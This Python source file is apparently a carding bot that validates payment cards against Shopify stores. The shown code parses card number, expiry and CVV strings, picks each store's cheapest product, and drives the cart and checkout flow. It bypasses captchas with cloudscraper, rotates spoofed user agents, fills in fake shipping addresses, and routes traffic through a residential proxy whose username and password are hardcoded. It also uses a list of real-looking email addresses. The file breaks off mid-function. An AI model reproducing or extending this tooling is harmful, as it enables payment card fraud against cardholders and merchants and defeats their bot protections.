from time import sleep
import asyncio
import re
import base64
import json
import time
from urllib.parse import urlparse, urljoin
import random
import html
from datetime import datetime, timezone, timedelta
import uuid
import logging
import hashlib
from typing import Optional

from BOT.Charge.Shopify.tls_session import TLSAsyncSession
from BOT.Charge.Shopify.bulletproof_session import BulletproofSession

# Import captcha solver
try:
    from BOT.helper.shopify_captcha_solver import (
        ShopifyCaptchaSolver,
        generate_bypass_data,
        BrowserFingerprint,
        MotionDataGenerator,
    )
    CAPTCHA_SOLVER_AVAILABLE = True
except ImportError:
    CAPTCHA_SOLVER_AVAILABLE = False

try:
    import cloudscraper
    HAS_CLOUDSCRAPER = True
except ImportError:
    HAS_CLOUDSCRAPER = False

# Configure logging
logger = logging.getLogger(__name__)

# Low-product details API (Silver-bullet style): returns variant, pricing, location, checkout URLs
LOW_PRODUCT_API_BASE = "https://shopify-api-new-production.up.railway.app"
LOW_PRODUCT_API_HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
    "Pragma": "no-cache",
    "Accept": "*/*",
}


def _log_output_to_terminal(output: dict) -> None:
    """No-op: logging is done in single.py per check_one to avoid spam."""
    pass


def get_proxy():
    host, port, user, password = "ipv6-residential-bridge.bytezero.io", "1111", "0gzKNdn7m1-country-US", "8%2HUKRlNsR1"
    return f"http://{user}:{password}@{host}:{port}"

async def check_ip_with_proxy():
    proxy = get_proxy()
    async with TLSAsyncSession(proxy=proxy) as client:
        res = await client.get("https://api.ipify.org?format=json")
        print("With Proxy:", res.json())


C2C = {
    "USD": "US",
    "CAD": "CA",
    "INR": "IN",
    "AED": "AE",
    "HKD": "HK",
    "GBP": "GB",
    "CHF": "CH",
}

book = {
    "US": {"address1": "123 Main", "city": "NY", "postalCode": "10080", "zoneCode": "NY", "countryCode": "US", "phone": "2194157586", "currencyCode": "USD"},
    "CA": {"address1": "88 Queen", "city": "Toronto", "postalCode": "M5J2J3", "zoneCode": "ON", "countryCode": "CA", "phone": "4165550198", "currencyCode": "CAD"},
    "GB": {"address1": "221B Baker Street", "city": "London", "postalCode": "NW1 6XE", "zoneCode": "LND", "countryCode": "GB", "phone": "2079460123", "currencyCode": "USD"},
    "IN": {"address1": "221B MG", "city": "Mumbai", "postalCode": "400001", "zoneCode": "MH", "countryCode": "IN", "phone": "+91 9876543210", "currencyCode": "USD"},
    "AE": {"address1": "Burj Tower", "city": "Dubai", "postalCode": "", "zoneCode": "DU", "countryCode": "AE", "phone": "+971 50 123 4567", "currencyCode": "USD"},
    "HK": {"address1": "Nathan 88", "city": "Kowloon", "postalCode": "", "zoneCode": "KL", "countryCode": "HK", "phone": "+852 5555 5555", "currencyCode": "USD"},
    "CN": {"address1": "8 Zhongguancun Street", "city": "Beijing", "postalCode": "100080", "zoneCode": "BJ", "countryCode": "CN", "phone": "1062512345", "currencyCode": "USD"},
    "CH": {"address1": "Gotthardstrasse 17", "city": "Schweiz", "postalCode": "6430", "zoneCode": "SZ", "countryCode": "CH", "phone": "445512345", "currencyCode": "USD"},
    "AU": {"address1": "1 Martin Place", "city": "Sydney", "postalCode": "2000", "zoneCode": "NSW", "countryCode": "AU", "phone": "291234567", "currencyCode": "USD"},
    "SI": {"address1": "Slovenska cesta 50", "city": "Ljubljana", "postalCode": "1000", "zoneCode": "LJ", "countryCode": "SI", "phone": "38621984156", "currencyCode": "USD"},
    "DEFAULT": {"address1": "123 Main", "city": "New York", "postalCode": "10080", "zoneCode": "NY", "countryCode": "US", "phone": "2194157586", "currencyCode": "USD"},
}


def pick_addr(url, cc=None, rc=None):

    cc = (cc or "").upper()
    rc = (rc or "").upper()
    dom = urlparse(url).netloc
    tcn = dom.split('.')[-1].upper()

    if tcn in book:
        return book[tcn]

    ccn = C2C.get(cc)

    if rc in book and ccn == rc:
        return book[rc]
    elif rc in book:
        return book[rc]
    return book["DEFAULT"]

def capture(data, first, last):
  """Extract text between first and last markers. Returns None if not found or data is None."""
  if not data or not isinstance(data, str):
      return None
  try:
      start = data.index(first) + len(first)
      end = data.index(last, start)
      return data[start:end]
  except (ValueError, AttributeError, TypeError):
      return None


# ========== SINGLE CANONICAL SESSION TOKEN PARSING ==========
# One inbuilt parsing only. Exact format: <meta name="serialized-sessionToken" content="&quot;TOKEN&quot;"/>
# Variable name used everywhere: x_checkout_one_session_token (headers + GraphQL sessionToken).
SESSION_TOKEN_PREFIX = '<meta name="serialized-sessionToken" content="&quot;'
SESSION_TOKEN_SUFFIX = '&quot;"/>'


def _extract_session_token(checkout_text: str) -> Optional[str]:
    """
    Extract x_checkout_one_session_token using the single canonical prefix/suffix.
    Prefix: <meta name="serialized-sessionToken" content="&quot;
    Suffix: &quot;"/>
    Use this value everywhere: x-checkout-one-session-token header and sessionToken in GraphQL.
    """
    if not checkout_text or not isinstance(checkout_text, str):
        return None
    v = capture(checkout_text, SESSION_TOKEN_PREFIX, SESSION_TOKEN_SUFFIX)
    if not v or not isinstance(v, str):
        v = capture(checkout_text, SESSION_TOKEN_PREFIX, '&quot;" />')  # variant: space before />
    if not v and SESSION_TOKEN_PREFIX.startswith("<meta "):
        # Fallback: try without leading "<meta " in case attribute order differs
        alt_prefix = 'name="serialized-sessionToken" content="&quot;'
        v = capture(checkout_text, alt_prefix, SESSION_TOKEN_SUFFIX) or capture(checkout_text, alt_prefix, '&quot;" />')
    if v and isinstance(v, str):
        v = v.strip()
        if len(v) > 10:
            return v
    return None


def _capture_multi(data: str, *pairs) -> Optional[str]:
    """Try multiple (first, last) patterns; return first non-empty match."""
    if not data:
        return None
    for first, last in pairs:
        try:
            v = capture(data, first, last)
            if v and str(v).strip():
                return v.strip()
        except Exception:
            pass
    return None


def _get_checkout_url_from_cart_response(response_data: dict) -> Optional[str]:
    """Extract checkoutUrl from cart create GraphQL response. Handles multiple response shapes."""
    if not response_data or not isinstance(response_data, dict):
        return None
    data = response_data.get("data") or {}
    if not data:
        return None
    # Alias result:cartCreate -> result
    for key in ("result", "cartCreate"):
        node = data.get(key)
        if not isinstance(node, dict):
            continue
        cart = node.get("cart")
        if isinstance(cart, dict):
            url = cart.get("checkoutUrl")
            if url and isinstance(url, str) and url.startswith("http"):
                return url
    return None

def _products_from_json_text(text: str):
    """Parse products from raw /products.json text. Returns (product_id, price) or raises ValueError."""
    if not text or not text.strip():
        raise ValueError("SITE_EMPTY_RESPONSE")
    t = text.strip()
    if t.startswith("<!") or t.startswith("<html") or t.startswith("<HTML"):
        if any(x in t.lower() for x in ["captcha", "hcaptcha", "recaptcha", "challenge", "verify"]):
            raise ValueError("SITE_CAPTCHA_BLOCK")
        raise ValueError("SITE_HTML_ERROR")
    try:
        response_data = json.loads(t)
    except json.JSONDecodeError as e:
        if "Expecting value" in str(e):
            raise ValueError("SITE_EMPTY_JSON")
        raise ValueError("SITE_INVALID_JSON")
    if "products" not in response_data:
        raise ValueError("SITE_NO_PRODUCTS_KEY")
    products_data = response_data["products"]
    if not products_data:
        raise ValueError("SITE_PRODUCTS_EMPTY")
    products = {}
    for product in products_data:
        try:
            variants = product.get("variants", [])
            if not variants:
                continue
            variant = variants[0]
            product_id = variant.get("id")
            available = variant.get("available", False)
            price_str = variant.get("price", "0")
            price = float(price_str) if price_str else 0.0
            if price < 0.1:
                continue
            if available and product_id:
                products[product_id] = price
        except (KeyError, ValueError, TypeError):
            continue
    if products:
        min_id = min(products, key=products.get)
        return min_id, products[min_id]
    raise ValueError("SITE_PRODUCTS_EMPTY")


def _first_product_handle_from_json_text(text: str) -> Optional[str]:
    """Parse first product handle from /products.json text. Returns handle or None."""
    if not text or not text.strip() or text.strip().startswith("<"):
        return None
    try:
        data = json.loads(text)
        products_list = data.get("products") if isinstance(data, dict) else None
        if not products_list or not isinstance(products_list, list):
            return None
        for p in products_list:
            if not isinstance(p, dict):
                continue
            handle = p.get("handle")
            if handle and isinstance(handle, str) and handle.strip():
                return handle.strip()
        return None
    except (json.JSONDecodeError, TypeError):
        return None


def _parse_low_product_api_response(text: str) -> Optional[dict]:
    """
    Parse low-product API JSON response. Returns dict with variantid, price, requires_shipping,
    formatted_price, currency_code, currency_symbol, country_code, price1 (from formatted_price)
    or None on failure. Matches Silver-bullet parsing patterns.
    """
    if not text or not text.strip():
        return None
    t = text.strip()
    if t.startswith("<!") or t.startswith("<html") or t.startswith("<HTML"):
        return None
    try:
        data = json.loads(t)
    except json.JSONDecodeError:
        return None
    if not isinstance(data, dict) or not data.get("success"):
        return None
    variant = data.get("variant")
    pricing = data.get("pricing")
    location = data.get("location")
    if not isinstance(variant, dict):
        return None
    variant_id = variant.get("id")
    if variant_id is None:
        return None
    try:
        variant_id = int(variant_id)
    except (TypeError, ValueError):
        return None
    requires_shipping = variant.get("requires_shipping", False)
    price_val = None
    currency_code = ""
    currency_symbol = ""
    formatted_price = ""
    country_code = ""
    if isinstance(pricing, dict):
        price_val = pricing.get("price")
        if price_val is not None:
            try:
                price_val = float(price_val)
            except (TypeError, ValueError):
                price_val = None
        currency_code = (pricing.get("currency_code") or "")
        currency_symbol = (pricing.get("currency_symbol") or "")
        formatted_price = (pricing.get("formatted_price") or "")
    if isinstance(location, dict):
        country_code = (location.get("country_code") or "")
    price1 = (formatted_price.lstrip("$").strip() or None) if formatted_price else None
    return {
        "variantid": variant_id,
        "price": price_val if price_val is not None else 0.0,
        "requires_shipping": requires_shipping,
        "formatted_price": formatted_price,
        "currency_code": currency_code,
        "currency_symbol": currency_symbol,
        "country_code": country_code,
        "price1": price1 or formatted_price,
    }


async def _fetch_low_product_api(domain: str, session, proxy: Optional[str] = None) -> Optional[dict]:
    """
    GET low-product API for domain (e.g. stickerdad.com). Bulletproof headers, retries, domain variants.
    Returns parsed dict (variantid, price, ...) or None.
    """
    if not domain or not str(domain).strip():
        return None
    domain = str(domain).strip().lower()
    if "://" in domain:
        domain = urlparse(domain).netloc or domain
    # Try domain as-is, then with/without www (API may expect either)
    domains_to_try = [domain]
    if domain.startswith("www."):
        domains_to_try.append(domain[4:])
    else:
        domains_to_try.append("www." + domain)
    for _domain in domains_to_try:
        for attempt in range(2):
            try:
                api_url = f"{LOW_PRODUCT_API_BASE}/{_domain}"
                resp = await session.get(
                    api_url,
                    headers=dict(LOW_PRODUCT_API_HEADERS),
                    timeout=25,
                    follow_redirects=True,
                )
                if not resp or getattr(resp, "status_code", 0) != 200:
                    if attempt < 1:
                        await asyncio.sleep(1.0)
                    continue
                text = (getattr(resp, "text", None) or "").strip()
                result = _parse_low_product_api_response(text)
                if result:
                    return result
            except Exception as e:
                logger.debug(f"Low-product API fetch failed for {_domain} attempt {attempt}: {e}")
                if attempt < 1:
                    await asyncio.sleep(1.0)
    # Fallback: try direct (no proxy) in case proxy blocks Railway API
    try:
        import httpx
        for _domain in domains_to_try:
            try:
                api_url = f"{LOW_PRODUCT_API_BASE}/{_domain}"
                async with httpx.AsyncClient(timeout=20.0, follow_redirects=True) as client:
                    resp = await client.get(api_url, headers=dict(LOW_PRODUCT_API_HEADERS))
                    if resp.status_code == 200 and resp.text:
                        result = _parse_low_product_api_response(resp.text.strip())
                        if result:
                            logger.info(f"Low-product API via direct (no proxy) for {_domain}")
                            return result
            except Exception as e:
                logger.debug(f"Low-product API direct fetch failed for {_domain}: {e}")
    except ImportError:
        pass
    return None


def _fetch_products_cloudscraper_sync(url: str, proxy: Optional[str] = None):
    """Fetch /products.json via cloudscraper (captcha bypass). Returns (product_id, price) or raises."""
    if not HAS_CLOUDSCRAPER:
        raise ValueError("SITE_CAPTCHA_BLOCK")
    u = url.rstrip("/").split("?")[0]
    fetch_url = f"{u}/products.json?limit=100"
    scraper = cloudscraper.create_scraper(browser={"browser": "chrome", "platform": "windows", "mobile": False})
    proxies = {"http": proxy, "https": proxy} if proxy and str(proxy).strip() else None
    r = scraper.get(fetch_url, timeout=20, proxies=proxies)
    if r.status_code != 200:
        raise ValueError(f"SITE_HTTP_{r.status_code}")
    return _products_from_json_text(r.text or "")


def _fetch_checkout_cloudscraper_sync(checkout_url: str, proxy: Optional[str] = None):
    """Fetch checkout page via cloudscraper (captcha bypass). Returns (status_code, text)."""
    if not HAS_CLOUDSCRAPER:
        return (0, "")
    scraper = cloudscraper.create_scraper(browser={"browser": "chrome", "platform": "windows", "mobile": False})
    proxies = {"http": proxy, "https": proxy} if proxy else None
    try:
        r = scraper.get(
            checkout_url,
            headers={
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.9",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            },
            timeout=20,
            proxies=proxies,
        )
        return (r.status_code, r.text or "")
    except Exception:
        return (0, "")


def _fetch_store_page_cloudscraper_sync(store_url: str, proxy: Optional[str] = None):
    """Fetch store page via cloudscraper (captcha bypass). Returns (status_code, text)."""
    if not HAS_CLOUDSCRAPER:
        return (0, "")
    scraper = cloudscraper.create_scraper(browser={"browser": "chrome", "platform": "windows", "mobile": False})
    proxies = {"http": proxy, "https": proxy} if proxy else None
    try:
        r = scraper.get(
            store_url,
            headers={
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.9",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            },
            timeout=20,
            proxies=proxies,
        )
        return (r.status_code, r.text or "")
    except Exception:
        return (0, "")


def _extract_checkout_tokens_robust(checkout_text: str) -> dict:
    """
    Bulletproof extraction of checkout tokens from Shopify checkout HTML.
    Returns dict with keys: session_token, source_token, queue_token, stable_id.
    Uses meta tags (any attribute order), JSON in script, and HTML-entity encoded patterns.
    Exact format: <meta name="serialized-sessionToken" content="&quot;TOKEN&quot;"/>
    """
    out = {"session_token": None, "source_token": None, "queue_token": None, "stable_id": None}
    if not checkout_text or not isinstance(checkout_text, str):
        return out
    text = checkout_text

    # Session token: single canonical parser only (prefix/suffix)
    out["session_token"] = _extract_session_token(text)

    # Source token: canonical meta format first (same as session token)
    out["source_token"] = capture(text, '<meta name="serialized-sourceToken" content="&quot;', '&quot;"/>') or capture(text, 'name="serialized-sourceToken" content="&quot;', '&quot;"/>')
    if not out["source_token"] and ("serialized-sourceToken" in text or "serialized-source-token" in text):
        for pat in [
            r'name\s*=\s*["\']serialized-sourceToken["\'][^>]*?content\s*=\s*["\']&quot;(.+?)&quot;\s*"\s*/\s*>',
            r'name\s*=\s*["\']serialized-sourceToken["\'][^>]*?content\s*=\s*&quot;(.+?)&quot;\s*"\s*/\s*>',
            r'content\s*=\s*["\']&quot;(.+?)&quot;\s*"\s*/\s*>[^<]*name\s*=\s*["\']serialized-sourceToken["\']',
        ]:
            m = re.search(pat, text, re.I | re.DOTALL)
            if m:
                v = m.group(1).strip()
                if v and len(v) > 10:
                    out["source_token"] = v
                    break
        if not out["source_token"]:
            out["source_token"] = _capture_multi(
                text,
                ('name="serialized-sourceToken" content="&quot;', '&quot;"/>'),
                ('name="serialized-sourceToken" content="&quot;', '&quot;" />'),
                ('serialized-sourceToken" content="&quot;', '&quot;"/>'),
                ('serialized-source-token" content="&quot;', '&quot'),
                ('serialized-source-token" content="', '"'),
                ('name="serialized-source-token" content="', '"'),
                ("name='serialized-source-token' content='", "'"),
            )
    if not out["source_token"]:
        for name_pat, content_pat in [
            (r'name=["\']serialized-source-token["\'][^>]+content=["\']([^"\']+)["\']', r'content=["\']([^"\']+)["\'][^>]+name=["\']serialized-source-token["\']'),
            (r'content="([^"]+)"[^>]+name="serialized-source-token"', None),
        ]:
            m = re.search(name_pat, text, re.I | re.DOTALL)
            if m:
                v = m.group(1).strip()
                if v and len(v) > 10:
                    out["source_token"] = v
                    break
            if content_pat:
                m = re.search(content_pat, text, re.I | re.DOTALL)
                if m:
                    v = m.group(1).strip()
                    if v and len(v) > 10:
                        out["source_token"] = v
                        break
    if not out["source_token"] and "serializedSourceToken" in text:
        m = re.search(r'"serializedSourceToken"\s*:\s*"((?:[^"\\]|\\.)*)"', text)
        if m:
            out["source_token"] = m.group(1).replace("\\\"", '"').strip()
    if not out["source_token"]:
        m = re.search(r'"sourceToken"\s*:\s*"((?:[^"\\]|\\.)*)"', text)
        if m:
            out["source_token"] = m.group(1).replace("\\\"", '"').strip()
    if not out["source_token"]:
        m = re.search(r"'sourceToken'\s*:\s*'([^']+)'", text)
        if m:
            out["source_token"] = m.group(1).strip()
    if out["source_token"] and isinstance(out["source_token"], str):
        out["source_token"] = out["source_token"].strip() or None
    if out["source_token"] and len(out["source_token"]) < 10:
        out["source_token"] = None

    # Queue token (often in JSON blob); suffix &quot; (with semicolon) per script
    if not out["queue_token"]:
        out["queue_token"] = _capture_multi(
            text,
            ('queueToken&quot;:&quot;', '&quot;'),
            ('queueToken":"', '"'),
            ('"queueToken":"', '"'),
        ) or capture(text, "queueToken&quot;:&quot;", "&quot;")
    if not out["queue_token"]:
        m = re.search(r'"queueToken"\s*:\s*"([^"]+)"', text)
        if m:
            out["queue_token"] = m.group(1)
        if not out["queue_token"]:
            m = re.search(r"'queueToken'\s*:\s*'([^']+)'", text)
            if m:
                out["queue_token"] = m.group(1)
        if not out["queue_token"]:
            m = re.search(r'"queueToken"\s*:\s*"((?:[^"\\]|\\.)*)"', text)
            if m:
                out["queue_token"] = m.group(1).replace("\\\"", '"').strip()
    if out["queue_token"] and isinstance(out["queue_token"], str):
        out["queue_token"] = out["queue_token"].strip() or None

    # Stable ID; suffix &quot; (with semicolon) per script
    if not out["stable_id"]:
        out["stable_id"] = _capture_multi(
            text,
            ('stableId&quot;:&quot;', '&quot;'),
            ('stableId":"', '"'),
            ('"stableId":"', '"'),
        ) or capture(text, "stableId&quot;:&quot;", "&quot;")
    if not out["stable_id"]:
        m = re.search(r'"stableId"\s*:\s*"([^"]+)"', text)
        if m:
            out["stable_id"] = m.group(1)
        if not out["stable_id"]:
            m = re.search(r"'stableId'\s*:\s*'([^']+)'", text)
            if m:
                out["stable_id"] = m.group(1)
        if not out["stable_id"]:
            m = re.search(r'stableId["\']?\s*:\s*["\']([^"\']+)["\']', text)
            if m:
                out["stable_id"] = m.group(1).strip()
    if out["stable_id"] and isinstance(out["stable_id"], str):
        out["stable_id"] = out["stable_id"].strip() or None

    return out


def get_product_id(response):
    """
    Extract the lowest priced available product from /products.json response.
    Returns (product_id, price) tuple or raises ValueError with descriptive message.
    """
    if not response or not response.text:
        raise ValueError("SITE_EMPTY_RESPONSE")
    return _products_from_json_text(response.text)


USER_AGENTS = [
    # --- Android ---
    "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.6367.207 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.6312.107 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; OnePlus Nord) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.6261.94 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Pixel 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.6367.93 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; SM-A715F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.6312.86 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; Redmi Note 10 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.6261.68 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; V2027) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.6167.85 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; Realme RMX3085) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.6099.225 Mobile Safari/537.36",

    # --- Windows Desktop ---
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.6367.207 Safari/537.36",
    "Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.6400.120 Safari/537.36",

    # Google Pixel 8
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.6367.207 Mobile Safari/537.36",

    # Samsung Galaxy S24
    "Mozilla/5.0 (Linux; Android 14; SM-S921B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.6400.93 Mobile Safari/537.36",

    # OnePlus 12
    "Mozilla/5.0 (Linux; Android 14; CPH2573) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.6312.99 Mobile Safari/537.36",

    # Xiaomi 14
    "Mozilla/5.0 (Linux; Android 14; 23127PN0CC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.6378.88 Mobile Safari/537.36",

    # Vivo X100
    "Mozilla/5.0 (Linux; Android 14; V2309A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.6261.119 Mobile Safari/537.36",

    # Realme GT 5 Pro
    "Mozilla/5.0 (Linux; Android 14; RMX3888) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.6312.91 Mobile Safari/537.36",

    # Motorola Edge 50 Pro
    "Mozilla/5.0 (Linux; Android 14; XT2401-2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.6367.71 Mobile Safari/537.36",

    # Asus ROG Phone 8
    "Mozilla/5.0 (Linux; Android 14; ASUS_AI2401_D) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.6312.112 Mobile Safari/537.36",

]

def get_random_user_agent():
    return random.choice(USER_AGENTS)


def generate_security_token(url: str, card: str, timestamp: float = None) -> str:
    """
    Generate a security token to wrap requests and prevent direct API blocking.
    Creates a unique token based on URL, card, and timestamp for request authentication.
    """
    if timestamp is None:
        timestamp = time.time()
    
    # Create a unique token based on URL domain, timestamp, and a random component
    domain = urlparse(url).netloc if urlparse(url).netloc else url.split("//")[-1].split("/")[0]
    token_data = f"{domain}|{timestamp}|{random.randint(100000, 999999)}|{card[:6]}"
    token_hash = hashlib.sha256(token_data.encode()).hexdigest()[:32]
    
    # Format as UUID-like token for legitimacy
    token = f"{token_hash[:8]}-{token_hash[8:12]}-{token_hash[12:16]}-{token_hash[16:20]}-{token_hash[20:32]}"
    return token


def wrap_request_with_token(headers: dict, url: str, card: str, json_data: dict = None) -> tuple:
    """
    Wrap request with security token to prevent direct API blocking.
    Adds security tokens to headers only (doesn't modify JSON structure for API compatibility).
    Returns (updated_headers, original_json_data).
    """
    token = generate_security_token(url, card)
    timestamp = int(time.time() * 1000)
    request_id = str(uuid.uuid4())
    
    # Add security token to headers (not in JSON to maintain API compatibility)
    headers['X-Request-Token'] = token
    headers['X-Request-Timestamp'] = str(timestamp)
    headers['X-Request-Id'] = request_id
    headers['X-Client-Version'] = '1.0.0'
    headers['X-Security-Check'] = '1'
    
    # Return headers and original JSON data (unchanged for API compatibility)
    return headers, json_data

# Determine sec-ch-ua-platform based on device string
def platform(ua):
    if "Android" in ua:
        return "Android"
    elif "iPhone" in ua or "iPad" in ua:
        return "iOS"
    elif "Macintosh" in ua:
        return "macOS"
    elif "Windows" in ua:
        return "Windows"
    elif "CrOS" in ua:
        return "Chrome OS"
    else:
        return "Unknown"

async def autoshopify(url, card, session, proxy=None):

    output = {
        "Response": "UNKNOWN ERROR",
        "Status": False,
        "cc": card,
    }
    start = time.time()
    getua = get_random_user_agent()
    clienthint = platform(getua)
    gmail = __import__('random').choice(['shaikhfurkan45107@gmail.com', 'shaikhfurkan70145@gmail.com', 'huhagenma@gmail.com', 'huhagenam@gmail.com', 'fukkiharamkhor@gmail.com', 'teamsamrat5@gmail.com', 'macbhula@gmail.com', 'bhulamac@gmail.com'])
    mobile = '?1' if any(x in getua for x in ["Android", "iPhone", "iPad", "Mobile"]) else '?0'

    # print(getua)
    # print(clienthint)
    # print(mobile)
    try:
        parsed = urlparse(url)
        if parsed:
            domain = parsed.netloc
        else:
            domain = url.split("//")[1]
        
        
        cc,mes,ano,cvv = map(str.strip,card.split("|"))

        if not url.startswith(("http://", "https://")):
            url = "https://" + url
        else:
            url = urlparse(url)
            url = f"https://{domain}"

        # print(domain, url)

        headers = {
            "User-Agent": f'{getua}',
            "Accept": "application/json",
            "Accept-Language": "en-US,en;q=0.9",
        }
        
        # Removed tokenization - using bulletproof session instead

        # Low-product API first (Silver-bullet style): GET shopify-api-new-production.up.railway.app/<site>
        low_product_flow = False
        product_id, price = None, None
        request = None
        try:
            low_product = await _fetch_low_product_api(domain, session, proxy)
            if low_product and low_product.get("variantid") is not None:
                product_id = low_product["variantid"]
                price = low_product.get("price")
                if price is None:
                    price = 0.0
                low_product_flow = True
                logger.info(f"Low-product API used for {url}")
        except Exception:
            pass

        if not low_product_flow:
            # Bulletproof: try cloudscraper first for products to avoid triggering captcha on session
            product_id, price = None, None
            request = None
            if HAS_CLOUDSCRAPER:
                try:
                    product_id, price = await asyncio.to_thread(_fetch_products_cloudscraper_sync, url, proxy)
                    if product_id and price is not None:
                        logger.info(f"Products via cloudscraper-first (captcha avoidance) for {url}")
                except Exception:
                    product_id, price = None, None

            # Fetch products via session only when cloudscraper didn't succeed
            products_fetch_retries = 5  # Increased retries for connection stability
            last_error = None
            if not product_id:
                for attempt in range(products_fetch_retries):
                    try:
                        request = await session.get(f"{url}/products.json", headers=headers, follow_redirects=True, timeout=25)
                        # Check if request failed
                        if not request:
                            last_error = "No response object"
                            if attempt < products_fetch_retries - 1:
                                await asyncio.sleep(0.8 + attempt * 0.5)  # Longer backoff
                                continue
                            output.update({
                                "Response": "SITE_CONNECTION_ERROR",
                                "Status": False,
                            })
                            _log_output_to_terminal(output)
                            return output

                        sc = getattr(request, "status_code", 0)
                        if sc == 0:
                            # Bubble up the underlying client error text if present (DNS/proxy/TLS/etc.)
                            last_error = (getattr(request, "text", "") or "").strip() or "Status code 0 (connection failed)"
                            if attempt < products_fetch_retries - 1:
                                await asyncio.sleep(0.8 + attempt * 0.5)  # Exponential backoff
                                continue
                            output.update({
                                "Response": f"SITE_CONNECTION_ERROR: {last_error[:80]}",
                                "Status": False,
                            })
                            _log_output_to_terminal(output)
                            return output

                        if sc == 200:
                            break
                        if sc == 429 or (500 <= sc <= 599):
                            if attempt < products_fetch_retries - 1:
                                backoff = 2.0 + attempt * 1.0 if sc == 429 else 0.8 + attempt * 0.6
                                await asyncio.sleep(backoff)
                                continue
                        output.update({
                            "Response": f"SITE_HTTP_{sc}",
                            "Status": False,
                        })
                        _log_output_to_terminal(output)
                        return output
                    except Exception as e:
                        last_error = str(e)
                        if attempt < products_fetch_retries - 1:
                            # Exponential backoff for connection errors
                            await asyncio.sleep(0.8 + attempt * 0.5)
                            continue
                        output.update({
                            "Response": f"SITE_CONNECTION_ERROR: {last_error[:50]}",
                            "Status": False,
                        })
                        _log_output_to_terminal(output)
                        return output

                # Ensure we have a valid request after retries
                if not request or not hasattr(request, 'text'):
                    output.update({
                        "Response": f"SITE_CONNECTION_ERROR: {(last_error or 'unknown')[:80]}",
                        "Status": False,
                    })
                    _log_output_to_terminal(output)
                    return output

                # Parse products: bulletproof captcha avoidance - use cloudscraper when response is HTML/captcha
                product_id, price = None, None
                req_text = (request.text or "").strip() if hasattr(request, 'text') else ""
                if not req_text:
                    output.update({"Response": "SITE_EMPTY_RESPONSE", "Status": False})
                    _log_output_to_terminal(output)
                    return output

                # If response is HTML (captcha/challenge), try cloudscraper first without calling get_product_id
                if req_text.startswith("<") or req_text.startswith("<!") or "captcha" in req_text.lower() or "challenge" in req_text.lower():
                    if HAS_CLOUDSCRAPER:
                        try:
                            product_id, price = await asyncio.to_thread(_fetch_products_cloudscraper_sync, url, proxy)
                            logger.info(f"Products via cloudscraper bypass (HTML/captcha response) for {url}")
                        except Exception:
                            pass
                    if not product_id:
                        output.update({"Response": "SITE_CAPTCHA_BLOCK", "Status": False})
                        _log_output_to_terminal(output)
                        return output
                else:
                    try:
                        product_id, price = get_product_id(request)
                    except ValueError as e:
                        error_msg = str(e)
                        if error_msg == "SITE_CAPTCHA_BLOCK" and HAS_CLOUDSCRAPER:
                            try:
                                product_id, price = await asyncio.to_thread(_fetch_products_cloudscraper_sync, url, proxy)
                                logger.info(f"Products fetch via cloudscraper bypass for {url}")
                            except Exception:
                                pass
                        if not product_id:
                            output.update({"Response": error_msg, "Status": False})
                            _log_output_to_terminal(output)
                            return output

                if not product_id:
                    output.update({"Response": "NO_AVAILABLE_PRODUCTS", "Status": False})
                    _log_output_to_terminal(output)
                    return output

        if not product_id:
            output.update({"Response": "NO_AVAILABLE_PRODUCTS", "Status": False})
            _log_output_to_terminal(output)
            return output

        # Low-product flow: cart/add.js -> POST checkout -> redirect -> GET checkout page (skip store page & cartCreate)
        if low_product_flow:
            add_js_headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
                "Pragma": "no-cache",
                "Accept": "*/*",
                "Content-Type": "application/json",
                "Origin": url.rstrip("/"),
                "Referer": url.rstrip("/") + "/",
            }
            try:
                add_js_resp = await session.post(
                    f"{url.rstrip('/')}/cart/add.js",
                    headers=add_js_headers,
                    json={"items": [{"id": product_id, "quantity": 1}]},
                    timeout=18,
                )
                add_sc = getattr(add_js_resp, "status_code", 0)
                if add_sc != 200:
